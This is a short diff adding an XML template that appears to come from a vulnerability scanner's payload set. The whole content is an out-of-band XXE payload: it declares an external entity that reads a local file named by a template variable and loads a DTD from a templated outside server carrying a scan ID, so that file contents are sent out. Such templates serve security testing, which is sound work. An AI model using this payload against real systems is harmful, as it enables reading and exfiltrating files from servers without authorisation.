@@ -1,0 +1,7 @@
+<!DOCTYPE roottag [
+<!ENTITY % exfiltrate_data SYSTEM "file://$exfiltrate_filename">
+<!ENTITY % dtd SYSTEM "http://$dtd_server:$dtd_port/?scan_id=$scan_id&dtd_filename=$dtd_filename">
+%dtd;
+%send;
+]>
+<roottag>&myall;</roottag>
